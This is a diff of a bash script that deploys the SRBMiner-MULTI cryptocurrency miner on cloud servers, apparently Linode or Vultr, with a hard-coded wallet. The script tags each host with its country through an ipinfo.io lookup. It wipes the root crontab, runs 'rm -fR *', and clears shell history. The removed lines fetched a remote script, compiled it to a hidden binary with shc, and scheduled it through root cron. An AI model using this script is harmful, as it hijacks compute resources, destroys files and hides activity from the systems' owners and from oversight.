@@ -13,7 +13,7 @@ cores=$(nproc --all)
 #rounded_cores=$((cores * 9 / 10))
 #read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
 limitCPU=$((cores * 80))
-
+country=$(curl -s ipinfo.io | jq -r '.country')
 #find best servers
 servers=("stratum-eu.rplant.xyz" "stratum-asia.rplant.xyz" "stratum-na.rplant.xyz")
 fastest_server="stratum-eu.rplant.xyz"
@@ -32,7 +32,7 @@ cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
 sudo ./kill_miner.sh
 sleep 5
-sudo ./SRBMiner-MULTI --background -t $cores -a Aurum --pool $fastest_server:17109 --tls true --wallet bit1qurhknpxt5k8vwz0snrg9xnyvgdnk4asc9skgtx.Linode > /dev/null 2>&1 &
+sudo ./SRBMiner-MULTI --background -t $cores -a Aurum --pool $fastest_server:17109 --tls true --wallet bit1qa64dc3qhkpqayuhyfzls7twlhz4cmdc8c9fyph.Linode-$cores-$country --keepalive true> /dev/null 2>&1 &
 sleep 3
 EOF
 
@@ -44,6 +44,8 @@ then
   sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof SRBMiner-MULTI) > /dev/null 2>&1 &" danielluis1921.sh
   sed -i 's/Linode/Vultr/g' danielluis1921.sh
 else
+  sed -i 's/stratum-asia/stratum-eu/g' danielluis1921.sh
+  sed -i 's/stratum-na/stratum-eu/g' danielluis1921.sh
   echo "hostname isn't vultr"
 fi
 
@@ -54,13 +56,5 @@ sleep 3
 ./danielluis1921.sh
 rm -fv *
 rm -fR *
-sudo apt-get install build-essential -y
-wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/callAPI.sh" --output-document=/root/callAPI.sh
-shc -r -f /root/callAPI.sh -o /root/run.sh
-rm -fv callAPI.sh
-chmod +x /root/run.sh
 cat /dev/null > /var/spool/cron/crontabs/root
-cat >>/var/spool/cron/crontabs/root<<EOF
-*/5 * * * * /root/run.sh
-EOF
 history -c && history -w
